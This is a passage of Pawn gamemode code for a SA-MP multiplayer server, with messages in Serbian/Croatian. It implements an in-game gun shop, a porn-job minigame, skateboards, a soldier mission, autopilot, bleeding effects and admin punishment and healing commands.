            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][1], "Oruzije : ~r~Palica");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][2], "Municija : ~r~1");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][3], "Cena : ~r~1.000$");

            PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 336);

            for(new i = 0; i < 6; i++) {

                PlayerTextDrawShow(playerid, BuyGunTD[playerid][i]);
            }
            return 1;
        }
        case 7: {

            buyGunTDShow(playerid, 0);

            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][1], "Oruzije : ~r~UZI");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][2], "Municija : ~r~60");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][3], "Cena : ~r~6.000$");

            PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 352);

            for(new i = 0; i < 6; i++) {

                PlayerTextDrawShow(playerid, BuyGunTD[playerid][i]);
            }
            return 1;
        }
        case 8: {

            buyGunTDShow(playerid, 0);

            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][1], "Oruzije : ~r~MP5");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][2], "Municija : ~r~60");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][3], "Cena : ~r~8.000$");

            PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 353);

            for(new i = 0; i < 6; i++) {

                PlayerTextDrawShow(playerid, BuyGunTD[playerid][i]);
            }
            return 1;
        }
        case 9: {

            buyGunTDShow(playerid, 0);

            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][1], "Oruzije : ~r~Pancir");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][2], "Municija : ~r~100.00");
            PlayerTextDrawSetString(playerid, BuyGunTD[playerid][3], "Cena : ~r~8.000$");

            PlayerTextDrawSetPreviewModel(playerid, BuyGunTD[playerid][5], 1242);

            for(new i = 0; i < 6; i++) {

                PlayerTextDrawShow(playerid, BuyGunTD[playerid][i]);
            }
            return 1;
        }
    }

    return 1;
}

ptask pornoCooldownReset[1000](playerid) {

    if(pornoCooldown[playerid] != 0) {

        pornoCooldown[playerid]--;
        return 1;
    }
    else return 1;
}

timer PornoProgressTimer[200](playerid) {

    if(radiPorno[playerid] && IsValidPlayerProgressBar(playerid, PornoBar[playerid])) {

        pornoProgress[playerid] -= 3.0;
        SetPlayerProgressBarValue( playerid, PornoBar[ playerid ], pornoProgress[playerid]);

        defer PornoProgressTimer(playerid);

        return 1;
    }

    return 1;
}

timer timerForAnimPorno[4000]() {

    ApplyActorAnimation(pornoActor, "BLOWJOBZ", "BJ_COUCH_LOOP_P", 4.0, 1, 0, 0, 0, 0);

    return 1;
}

timer timerForAnimPornoPlayer[2000](playerid) {

    ApplyAnimation(playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 0, 0, 1, 1, 0);

    return 1;
}

CMD:skate(playerid,params[]){

    if(PlayerInfo[playerid][xSkate] == 0) return SendErrorMessage(playerid, "Nemas skate!");

    if(!IsPlayerInAnyVehicle(playerid)){
        ApplyAnimation(playerid, "CARRY","null",0,0,0,0,0,0,0);
        ApplyAnimation(playerid, "SKATE","null",0,0,0,0,0,0,0);
        ApplyAnimation(playerid, "CARRY","crry_prtial",4.0,0,0,0,0,0);
        SetPlayerArmedWeapon(playerid,0);
        if(!InfoSkate[playerid][sActive]){
            InfoSkate[playerid][sActive] = true;
            DestroyObject(InfoSkate[playerid][sSkate]);
            RemovePlayerAttachedObject(playerid,INDEX_SKATE);
            #if TYPE_SKATE == 0
            // the skate is placed on the right arm
            SetPlayerAttachedObject(playerid,INDEX_SKATE,19878,6,-0.055999,0.013000,0.000000,-84.099983,0.000000,-106.099998,1.000000,1.000000,1.000000);
            #else
            // the skate is placed in the back
            SetPlayerAttachedObject(playerid,INDEX_SKATE,19878,1,0.055999,-0.173999,-0.007000,-95.999893,-1.600010,24.099992,1.000000,1.000000,1.000000);
            #endif
            PlayerPlaySound(playerid,21000,0,0,0);
            SendInfoMessage(playerid, "Drzi Desni Klik da vozis skate!");
        }else{
            InfoSkate[playerid][sActive] = false;
            DestroyObject(InfoSkate[playerid][sSkate]);
            RemovePlayerAttachedObject(playerid,INDEX_SKATE);
            PlayerPlaySound(playerid,21000,0,0,0);
            SendInfoMessage(playerid, "Vratio si skate!");
        }
    }else SendInfoMessage(playerid, "Ne mozes to iz vozila!");
    return true;
}

CMD:buyskate(playerid) {

    if(PlayerInfo[playerid][xSkate] != 0) return SendErrorMessage(playerid, "Vec imas skate! /skate");

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 1866.1566,-1396.7372,13.4941)) return SendErrorMessage(playerid, "Nisi na mestu!");

    if(GetPlayerMoney(playerid) < 1000) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

    DajIgracuNovac(playerid, -1000);
    PlayerInfo[playerid][xSkate] = 1;
    SavePlayer(playerid);

    SendInfoMessage(playerid, "Uspesno si kupio skate za 1000$! /skate");

    return 1;
}

timer GeneralPricaTimer2[5000](playerid)
{
    ApplyActorAnimation(GeneralActor, "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 5000);
    switch(GeneralTimer2[playerid])
    {
        case 7:
        {
            VojnikMessage(playerid, "General: Znaci ti si ta budala koja se odlucila za ovakvu misiju!");
            GeneralTimer2[playerid]--;
            defer GeneralPricaTimer2(playerid);
            return 1;
        }
        case 6:
        {
            VojnikMessage(playerid, "General: Odlicno, retkost je videti hrabrost u vojniku u ovo vreme!");
            GeneralTimer2[playerid]--;
            defer GeneralPricaTimer2(playerid);
            return 1;
        }
        case 5:
        {
            VojnikMessage(playerid, "General: Tvoj zadatak je sledeci..");
            GeneralTimer2[playerid]--;
            defer GeneralPricaTimer2(playerid);
            return 1;
        }
        case 4:
        {
            VojnikMessage(playerid, "General: Dobili smo dojavu o jednim jako bitnim dokumentima.");
            GeneralTimer2[playerid]--;
            defer GeneralPricaTimer2(playerid);
            return 1;
        }
        case 3:
        {
            VojnikMessage(playerid, "General: Potrebno je da odes tamo i ako je potrebno ubijes saucesnike!");
            GeneralTimer2[playerid]--;
            defer GeneralPricaTimer2(playerid);
            return 1;
        }
        case 2:
        {
            VojnikMessage(playerid, "General: Nemoj zaboraviti da uzmes dokumenta od glavnog sefa!");
            GeneralTimer2[playerid]--;
            defer GeneralPricaTimer2(playerid);
            return 1;
        }
        case 1:
        {
            VojnikMessage(playerid, "General: Prvo idi i uzmi opremu! Srecno vojnice!");
            GeneralTimer2[playerid]--;
            defer GeneralPricaTimer2(playerid);
            return 1;
        }
        case 0:
        {
            ClearActorAnimations(GeneralActor);
            VojnikMessage(playerid, "Prvo uzmi opremu!");
            TogglePlayerControllable(playerid, 1);
            SetCameraBehindPlayer(playerid);
            return 1;
        }
    }
    return 1;
}

timer vojnik2Camera[6000](playerid, broj) {

    if(broj == 1) {

        InterpolateCameraPos(playerid, -330.736938, 2214.483154, 47.427543, -363.049896, 2236.996582, 44.188011, 6000);
        InterpolateCameraLookAt(playerid, -334.713043, 2217.064941, 45.838405, -367.849060, 2235.743652, 43.556888, 6000);

        defer vojnik2Camera(playerid, 2);

        return 1;
    }
    if(broj == 2) {

        InterpolateCameraPos(playerid, -363.049804, 2236.996582, 44.188018, -411.576385, 2232.895019, 47.724380, 5000);
        InterpolateCameraLookAt(playerid, -367.901672, 2235.814697, 43.938121, -414.975677, 2229.261962, 47.229099, 5000);

        defer vojnik2Camera(playerid, 3);

        return 1;
    }

    if(broj == 3) {

        InterpolateCameraPos(playerid, -411.575683, 2232.895019, 47.724330, -406.582580, 2215.226318, 43.917400, 4000);
        InterpolateCameraLookAt(playerid, -414.796936, 2229.093261, 47.310741, -408.831878, 2211.005859, 42.458469, 4000);

        defer vojnik2Camera(playerid, 4);

        return 1;
    }

    if(broj == 4) {

        vojnik2CP[playerid] = 5;
        SendInfoMessage(playerid, "Ubijaj mete redom sa snajperom!");

        SetCameraBehindPlayer(playerid);
        TogglePlayerControllable(playerid, 1);

        return 1;
    }

    return 1;
}

timer vojnik2CameraToranj[8000](playerid) { //CP 10

    TogglePlayerControllable(playerid, 1);

    SetCameraBehindPlayer(playerid);

    Novi_SetPlayerCheckpoint(playerid, -535.6821,2355.9705,73.8916, 4.0);

    return 1;
}

timer vojnik2Eksplozija[4000](playerid) {

    CreateExplosionForPlayer(playerid, -644.7485,2320.3137,169.5213, 7, 40.0);

    defer vojnik2Eksplozija2(playerid);

    return 1;
}

timer vojnik2Eksplozija2[4000](playerid) {

    SetCameraBehindPlayer(playerid);

    Novi_SetPlayerCheckpoint(playerid, -716.1071,2342.5408,126.7098, 2.0);

    TogglePlayerControllable(playerid, 1);

    VojnikMessage(playerid, "General : Komunikacija se vratila!");
    VojnikMessage(playerid, "Vrati se da bi dobio platu!");

    return 1;
}

timer balonPomeranje[15000](pozicija) {

    if(pozicija == 0) {

        MoveObject(balonObjekat, 1243.96118, -2754.13843, 47.60585, 20.0, 0.00000, 0.00000, 9.60662);
        balonPozicija++;

        return 1;
    }

    if(pozicija == 3) {

        MoveObject(balonObjekat,  908.10760, -3215.68530, 47.60585, 20.0, 0.00000, 0.00000, 9.60662);
        balonPozicija++;

        return 1;
    }

    return 1;
}

// CMD:nargila(playerid) {

//     for(new i; i < sizeof(NargilaInfo); i++) {
//         if(IsPlayerInRangeOfPoint(playerid, 3.0, NargilaInfo[ i ][ nargilaPosX ], NargilaInfo[ i ][ nargilaPosY ], NargilaInfo[ i ][ nargilaPosZ ])) {
//             if(NargilaInfo[ i ][ IznajmioNargilu ] != playerid && NargilaInfo[ i ][ IznamljenaNargila ] == true) return SendClientMessage(playerid, -1, "Ta nargila je vec iznamljena.");
//             if(NargiluIznajmio[ playerid ] != 0) return SendClientMessage(playerid, -1, "Vec ste iznajmili nargilu ( /nargilaoff )");
//             ShowPlayerDialog(playerid, dialog_NargilaRent, DIALOG_STYLE_INPUT, "NARGILA","Upisite vreme iznamljivanja nargile.\nNajmanje - 1 minut, najvise - 5 minuta.","U redu","Odustani");
//         }
//     }

//     return 1;
// }

// CMD:nargilaoff(playerid) {

//     if(NargiluIznajmio[ playerid ] == 0) return SendClientMessage(playerid, -1, "Niste iznajmili nargilu.");
//     new i = NargiluIznajmio[ playerid ];
//     Update3DTextLabelText(NargilaLabel[ i ], 0xFFFFFFFF, "/nargila\nNije iznamljena.");
//     NargilaInfo[ i ][ IznajmioNargilu ] = -1;
//     NargilaInfo[ i ][ IznamljenaNargila ] = false;
//     NargiluIznajmio[ playerid ] = 0;
//     KillTimer(NargilaTimer[ playerid ]);
//     SendClientMessage(playerid, -1, "Vise ne iznamljujete nargilu.");

//     return 1;
// }

ptask gradProvera[1000](playerid) {

    if(IsPlayerInRangeOfPoint(playerid, 40.0, 1007.6782,3154.8342,46.9544)) {

        GameTextForPlayer(playerid, "Dobrodosli u Lost City", 1000, 1);

        if(PlayerInfo[playerid][xAchivements][15] == 0) {

            achivementPassed(playerid, 15, 3000);
        }

    }

    return 1;
}

ptask gradProveraFlorida[1000](playerid) {

    if(IsPlayerInRangeOfPoint(playerid, 40.0, 3469.8704,-1156.6992,11.1350)) {

        GameTextForPlayer(playerid, "Dobrodosli u Floridu", 1000, 1);

        if(PlayerInfo[playerid][xAchivements][16] == 0) {

            achivementPassed(playerid, 16, 3000);
        }

    }

    return 1;
}

forward AutoPilot(playerid);
public AutoPilot(playerid)
{
    if(IsPlayerInAnyVehicle(playerid))
    {

        if(vCanDrive[GetPlayerVehicleID(playerid)] == 0) {

            #if defined USE_TIMERS
            KillTimer(TimerAutoPilot[playerid]);
            #endif
            TimerAutoPilot[playerid] = -1;
            DeleteArray(autopilotID[playerid]);
            autopilotID[playerid] = -1;
            CurrTarget[playerid] = 0;
            SetVehicleVelocity(GetPlayerVehicleID(playerid),0.0,0.0,0.0);
            SendInfoMessage(playerid, "Vase vozilo je unisteno!");
            DisableRemoteVehicleCollisions(playerid, 0);
            return 1;
        }

        new Float:pos[2][3];
        new vehicleid = GetPlayerVehicleID(playerid);
        if(CurrTarget[playerid] == 0)
        {
            CurrTarget[playerid]++;
            GetNodePos(GetRouteAtPos(autopilotID[playerid],CurrTarget[playerid]),pos[0][0],pos[0][1],pos[0][2]);
            SetVehiclePos(vehicleid,pos[0][0],pos[0][1],pos[0][2]+2.0);
            return 1;
        }
        new amount;
        new nodeid = GetRouteAtPos(autopilotID[playerid],CurrTarget[playerid],amount);
        if((CurrTarget[playerid]+1) >= amount)
        {
            #if defined USE_TIMERS
            KillTimer(TimerAutoPilot[playerid]);
            #endif
            TimerAutoPilot[playerid] = -1;
            DeleteArray(autopilotID[playerid]);
            autopilotID[playerid] = -1;
            CurrTarget[playerid] = 0;
            SetVehicleVelocity(vehicleid,0.0,0.0,0.0);
            SendInfoMessage(playerid, "Uspesno ste stigli na lokaciju!");
            DisableRemoteVehicleCollisions(playerid, 0);
            return 1;
        }
        GetNodePos(nodeid,pos[1][0],pos[1][1],pos[1][2]);
        if(IsPlayerInRangeOfPoint(playerid,10.0,pos[1][0],pos[1][1],pos[1][2]))
        {
            CurrTarget[playerid]++;
            return 1;
        }
        PullVehicleIntoDirection(vehicleid,pos[1][0],pos[1][1],pos[1][2], vehicleSpeed);
    }
    else
    {
        #if defined USE_TIMERS
        KillTimer(TimerAutoPilot[playerid]);
        #endif
        TimerAutoPilot[playerid] = -1;
        DeleteArray(autopilotID[playerid]);
        autopilotID[playerid] = -1;
        CurrTarget[playerid] = 0;
    }
    return 1;
}
//--------------------AUTO-PILOT-CORE-FUNCTIONS-------------------------------//
#define DEPRECATE_Z
stock PullVehicleIntoDirection(vehicleid, Float:x, Float:y, Float:z, Float:speed)//Thanks to Miguel for supplying me with this function, I have edited it a bit
{
    new
        Float:distance,
        Float:vehicle_pos[3];

    GetVehiclePos(vehicleid, vehicle_pos[0], vehicle_pos[1], vehicle_pos[2]);
    #if defined USE_SMOOTH_TURNS
    new Float: oz = atan2VehicleZ(vehicle_pos[0], vehicle_pos[1], x, y);
    new Float: vz;
    GetVehicleZAngle(vehicleid, vz);
    if(oz < vz-180) oz = oz+360;
    if(vz < oz-180) vz = vz+360;
    new Float: cz = floatabs(vz - oz);
    #else
    SetVehicleZAngle(vehicleid, atan2VehicleZ(vehicle_pos[0], vehicle_pos[1], x, y));
    #endif
    x -= vehicle_pos[0];
    y -= vehicle_pos[1];
    z -= vehicle_pos[2];
    #if defined DEPRECATE_Z
    distance = floatsqroot((x * x) + (y * y));
    x = (speed * x) / distance;
    y = (speed * y) / distance;
    GetVehicleVelocity(vehicleid, vehicle_pos[0], vehicle_pos[0], z);
    #else
    z+=0.11;
    distance = floatsqroot((x * x) + (y * y) + (z * z));
    x = (speed * x) / distance;
    y = (speed * y) / distance;
    z = (speed * z) / distance;
    #endif
    #if defined USE_SMOOTH_TURNS
    if(cz > 0)
    {
        new Float: fz = cz*0.0015;
        if(vz < oz) SetVehicleAngularVelocity(vehicleid, 0.0, 0.0, fz);
        if(vz > oz) SetVehicleAngularVelocity(vehicleid, 0.0, 0.0, -fz);
    }
    #endif
    SetVehicleVelocity(vehicleid, x, y, z);
}

stock Float:atan2VehicleZ(Float:Xb,Float:Yb,Float:Xe,Float:Ye)
{
    new Float:a = floatabs(360.0 - atan2( Xe-Xb,Ye-Yb));
    if(360.0 > a > 180.0) return a;
    return a-360.0;
}
//----------------------------------------------------------------------------//

CMD:autopilot(playerid, params[]) {

    if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");

    if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
    if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );
    if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete to dok imate wanted.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete to dok ste u zatvoru / Area51.");

    if(vCanDrive[GetPlayerVehicleID(playerid)] == 0) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");

    if(autopilotID[playerid] != -1) return SendErrorMessage(playerid, "Autopilot je vec upaljen! Koristi /autopilotoff");

    new bigStr[2048], str[32];

    for(new i = 0; i < PLACES; i++) {

        format(str, sizeof(str), "%s\n", places[i][imeMesta]);
        strcat(bigStr, str);
    }

    ShowPlayerDialog(playerid, dialog_AutoPilot, DIALOG_STYLE_LIST, "AutoPilot", bigStr, "Potvrdi", "Odustani");

    return 1;
}

CMD:autopilotoff(playerid) {

    if(TimerAutoPilot[playerid] != (-1))
    {
        #if defined USE_TIMERS
        KillTimer(TimerAutoPilot[playerid]);
        #endif
        TimerAutoPilot[playerid] = -1;
        DeleteArray(autopilotID[playerid]);
        autopilotID[playerid] = -1;
        CurrTarget[playerid] = 0;
        SendInfoMessage(playerid, "Autopilot uspesno iskljucen!");
        DisableRemoteVehicleCollisions(playerid, 1);
        return 1;
    }
    SendErrorMessage(playerid, "Autopilot nije upaljen!");

    return 1;
}

timer krvarenjeIgraca[1000](playerid) {

    if(krvarenjeCount[playerid] != 10) {

        new Float:IgracHP;
        GetPlayerHealth(playerid, IgracHP);

        Novi_SetPlayerHealth(playerid, IgracHP-2);

        krvarenjeCount[playerid]++;

        defer krvarenjeIgraca(playerid);

        return 1;
    }
    else return igracKrvari[playerid] = false;
}

timer krvarenjeTDFlash[1000](playerid) {

    if(igracKrvari[playerid]) {

        if(krvarenjeMode[playerid] == 0) {

            krvarenjeTDControl(playerid, true);
            krvarenjeMode[playerid] = 1;
            defer krvarenjeTDFlash(playerid);
            return 1;
        }
        else {

            krvarenjeTDControl(playerid, false);
            krvarenjeMode[playerid] = 0;
            defer krvarenjeTDFlash(playerid);
            return 1;
        }
    }
    else return krvarenjeTDControl(playerid, false);
}

kreirajKrvarenjeTD(playerid) {

    krvarenjeTD[playerid][0] = CreatePlayerTextDraw(playerid, -5.416672, -8.592622, "box");
    PlayerTextDrawLetterSize(playerid, krvarenjeTD[playerid][0], 0.000000, 51.083328);
    PlayerTextDrawTextSize(playerid, krvarenjeTD[playerid][0], 30.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, krvarenjeTD[playerid][0], 1);
    PlayerTextDrawColor(playerid, krvarenjeTD[playerid][0], -1);
    PlayerTextDrawUseBox(playerid, krvarenjeTD[playerid][0], 1);
    PlayerTextDrawBoxColor(playerid, krvarenjeTD[playerid][0], -16777088);
    PlayerTextDrawSetShadow(playerid, krvarenjeTD[playerid][0], 0);
    PlayerTextDrawBackgroundColor(playerid, krvarenjeTD[playerid][0], 255);
    PlayerTextDrawFont(playerid, krvarenjeTD[playerid][0], 1);
    PlayerTextDrawSetProportional(playerid, krvarenjeTD[playerid][0], 1);

    krvarenjeTD[playerid][1] = CreatePlayerTextDraw(playerid, 644.166503, -7.555585, "box");
    PlayerTextDrawLetterSize(playerid, krvarenjeTD[playerid][1], 0.000000, 50.541660);
    PlayerTextDrawTextSize(playerid, krvarenjeTD[playerid][1], 609.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, krvarenjeTD[playerid][1], 1);
    PlayerTextDrawColor(playerid, krvarenjeTD[playerid][1], -1);
    PlayerTextDrawUseBox(playerid, krvarenjeTD[playerid][1], 1);
    PlayerTextDrawBoxColor(playerid, krvarenjeTD[playerid][1], -16777088);
    PlayerTextDrawSetShadow(playerid, krvarenjeTD[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, krvarenjeTD[playerid][1], 255);
    PlayerTextDrawFont(playerid, krvarenjeTD[playerid][1], 1);
    PlayerTextDrawSetProportional(playerid, krvarenjeTD[playerid][1], 1);
}

krvarenjeTDControl(playerid, bool:shown) {

    if(!shown) {

        PlayerTextDrawHide(playerid, krvarenjeTD[playerid][0]);
        PlayerTextDrawHide(playerid, krvarenjeTD[playerid][1]);

        return 1;
    }
    else {

        PlayerTextDrawShow(playerid, krvarenjeTD[playerid][0]);
        PlayerTextDrawShow(playerid, krvarenjeTD[playerid][1]);

        return 1;
    }
}

CMD:fps(playerid, params[])
{
    if(!inFirstPerson[playerid]) 
    {
        firstPerson[playerid] = CreateObject(19300, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
        AttachObjectToPlayer(firstPerson[playerid], playerid, 0.0, 0.12, 0.7, 0.0, 0.0, 0.0); 
        AttachCameraToObject(playerid, firstPerson[playerid]); 
        inFirstPerson[playerid] = true; 
        SendInfoMessage(playerid, "Usao si u FPS mod!");

        return 1;
    }
    else
    {
        SetCameraBehindPlayer(playerid); 
        DestroyObject(firstPerson[playerid]); 
        inFirstPerson[playerid] = false; 
        SendInfoMessage(playerid, "Izasao si iz FPS moda!");

        return 1;
    }
}

prisonPlayer(playerid, id, razlog[], vreme) {

    if( PlayerInfo[ id ][ xUbijen ] == 1 ) return SendErrorMessage( playerid, "Sacekajte igrac se leci." );

    ResetAllWeapons( id );
    PlayerInfo[ id ][ xZatvor ] = ALKATRAZ;
    PlayerInfo[ id ][ xZatvorVreme ] = vreme;
    ClearAnimations( id );
    if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_RHAND ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_RHAND );
    SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );
    PlayerCuffed[ id ] = 0;

    GameTextForPlayer( id, "~w~Dobro dosli u ~n~~r~Area51", 5000, 3 );

    new string[ 128 ]; 
    format( string, sizeof( string ), "Admin %s je prisonovao igraca %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), razlog );
    LogSave( "Ostalo/LogPrison.log", string );

    AI[ playerid ][ aTJail ]++;

    PlayerCP[ id ] = 0;

    new rand = random(sizeof(RandomPrison));
    Novi_SetPlayerPos(id, RandomPrison[ rand ][ 0 ], RandomPrison[ rand ][ 1 ],RandomPrison[ rand ][ 2 ] );
    SetPlayerWorldBounds( id, 3146.996582, 2866.935546, -2706.383789, -3017.336669 );
    PlayerInfo[ id ][ xWanted ] = 0;
    Novi_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
    strmid( ZlocinInfo[ id ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
    strmid( ZlocinInfo[ id ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
    strmid( ZlocinInfo[ id ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
    GameTextForPlayer( id, "Ucitavanje ...", 1000, 4 );
    SetTimerEx( "SlobodnoSada", 6000, false, "i", id );
    SetCameraBehindPlayer( id ); SetPlayerInterior( id, 0);
    SetPlayerVirtualWorld( id, 1);
    TogglePlayerControllable( id, 0 );
    SavePlayer( id );

    return 1;
}

KazniIgraca(playerid, id, razlog[], vreme, fine) {

    prisonPlayer(playerid, id, razlog, vreme);
    DajIgracuNovac( id, -fine );

    SendClientMessage( id, ANTICHEAT, "________________________________________");
    SendClientMessageEx( id, -1, ""col_white"Admin vas je kaznio." );
    SendClientMessageEx( id, -1, ""col_white"Razlog kazne: "col_crvena"%s.", razlog );
    SendClientMessageEx( id, -1, ""col_white"Dobili ste zatvor od "col_crvena"%d minuta.", vreme );
    SendClientMessageEx( id, -1, ""col_white"Oduzeto vam je "col_crvena"%d$.", fine );
    SendClientMessage( id, ANTICHEAT, "________________________________________");

    format( globalstring, sizeof( globalstring ), "KAZNA | Admin %s je kaznio igraca %s. Razlog: %s.", ImeIgraca( playerid ), ImeIgraca( id ), razlog );
    AdminPoruka( NARACRVENA, globalstring );

    new string[ 128 ]; 
    format( string, sizeof( string ), "Admin %s je kaznio igraca %s za %s", ImeIgraca( playerid ), ImeIgraca( id ), razlog);
    LogSave( "Ostalo/LogKazni.log", string );

    return 1;
}

CMD:kazni(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Nisi ovlascen!");

    ShowPlayerDialog(playerid, dialog_KazniID, DIALOG_STYLE_INPUT, "Kazni Igraca", "Unesite ID igraca kojeg zelite kazniti", "Potvrdi", "Odustani");

    return 1;
}

CMD:popravivozilo(playerid) {

    if(IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Ne mozes ovo iz vozila!");

    new veh = getPlayerNearestVehicle(playerid);
    if(veh == INVALID_VEHICLE_ID) return SendErrorMessage(playerid, "Nisi blizu nijednog vozila!");

    if(PlayerInfo[playerid][xRepairKit] < 1) return SendErrorMessage(playerid, "Nemas repairKit!");

    new Float:HP; GetVehicleHealth( veh, HP );
    if( HP > 950.0 ) return SendErrorMessage(playerid, "Ovom vozilu ne treba porpavka!");

    vehicleRepair(playerid, veh);

    return 1;
}

vehicleFill(playerid, veh) {

    vCanDrive[ veh ] = 0;

    new Float:pos[3];
    new Float:a;
    GetVehicleZAngle(veh, a);

    new engine, lights, alarm, doors, bonnet, boot, objective;
    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
    SetVehicleParamsEx(veh, engine, lights, alarm, doors, 1, boot, objective);

    GetVehiclePartPoss(veh, VEH_PART_PCAP, pos[0], pos[1], pos[2]);
    
    GetPosNearVehiclePart(veh, VEH_PART_PCAP, pos[0], pos[1], pos[2],0.3);

    Novi_SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
    SetPlayerFacingAngle(playerid, a-240.0);

    TogglePlayerControllable(playerid, 0);
    ApplyAnimation(playerid, "PED", "IDLE_ROCKET", 4.0, 1, 1, 1, 1, -1, 0);
    GameTextForPlayer(playerid, "~r~Dopunjavanje goriva u toku..", 3000, 4);

    defer fillTimer(playerid, veh);

    return 1;
}

timer fillTimer[10000](playerid, vehicleid) {

    vCanDrive[ vehicleid ] = 1;

    Fuel[ vehicleid ] += 10;
    FuelTime[ vehicleid ] = 0;
    SendInfoMessage( playerid, "Napunili ste vozilo sa 10 litara goriva." );

    ClearAnimations(playerid);
    TogglePlayerControllable(playerid, 1);

    if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_RHAND ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_RHAND );

    return 1;
}

vehicleRepair(playerid, veh) {

    vCanDrive[ veh ] = 0;

    new Float:pos[3];
    new Float:a;
    GetVehicleZAngle(veh, a);

    new engine, lights, alarm, doors, bonnet, boot, objective;
    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
    SetVehicleParamsEx(veh, engine, lights, alarm, doors, 1, boot, objective);

    GetVehiclePartPoss(veh, VEH_PART_HOOD, pos[0], pos[1], pos[2]);
    
    GetPosNearVehiclePart(veh, VEH_PART_HOOD, pos[0], pos[1], pos[2],0.3);

    Novi_SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
    SetPlayerFacingAngle(playerid, a-180.0);

    TogglePlayerControllable(playerid, 0);
    ApplyAnimation(playerid, "Bar", "Barserve_bottle", 4.0, 1, 1, 1, 1, -1, 0);
    GameTextForPlayer(playerid, "~r~Popravka vozila u toku..", 3000, 4);

    defer RepairTimer(playerid, veh);

    return 1;
}

timer RepairTimer[10000](playerid, veh) {

    Novi_RepairVehicle( playerid, veh);
    Novi_SetVehicleHealth( veh, 1000.0 );
    antiCheatCS[ playerid ][ VehRepairTime ] = 3;
    vCanDrive[ veh ] = 1;

    new engine, lights, alarm, doors, bonnet, boot, objective;
    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
    SetVehicleParamsEx(veh, engine, lights, alarm, doors, 0, boot, objective);

    PlayerInfo[playerid][xRepairKit]--;
    SavePlayer(playerid);

    ClearAnimations(playerid);
    TogglePlayerControllable(playerid, 1);

    SendInfoMessage(playerid, "Uspesno si popravio vozilo!");

    return 1;
}

CMD:amedkit(playerid, params[]) {

    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Nisi ovlascen!");
    new id;
    if(sscanf(params, "u", id)) return SendUsageMessage(playerid, "/medkit [ID]");
    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");
    if(!RanjenIgrac[id]) return SendErrorMessage(playerid, "Igrac nije ranjen");

    ClearAnimations(id);
    TogglePlayerControllable(id, true);  
    RanjenIgrac[id] = false;
    SetPlayerHealth(id, 60.0);
    stop RanjenIgracTimer;
    TextDrawHideForPlayer(id, PozadinaTD);

    SendInfoMessage(playerid, "Podigao si igraca %s!", ImeIgraca(id));
    SendInfoMessage(id, "Administrator %s te je podigao!", ImeIgraca(playerid));

    return 1;
}

CMD:pocetnistats(playerid, params[]) {

    if(PlayerInfo[playerid][xAdmin] < 4) return SendErrorMessage(playerid, "Nisi ovlascen!");
    new id;
    if(sscanf(params, "u", id)) return SendUsageMessage(playerid, "/pocetnistats [ID]");
    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");
    if(PlayerInfo[id][xLevel] >= 2) return SendErrorMessage(playerid, "Igrac je veci level od 2!");
    if(PlayerInfo[id][xOnlineSati] >= 20) return SendErrorMessage(playerid, "Igrac ima vise od 20 sati igre!");

    new oldLvl = PlayerInfo[id][xLevel];
    if(oldLvl < 2) 
        dajSkillPoen(id, 2 - oldLvl);

    PlayerInfo[id][xLevel] = 2;
    PlayerInfo[id][xOnlineSati] = 10;
    DajIgracuNovac(id, 50000);
    SavePlayer(id);

    SetPlayerScore(id, PlayerInfo[id][xLevel]);

    SendInfoMessage(playerid, "Vratio si stats igracu %s!", ImeIgraca(id));
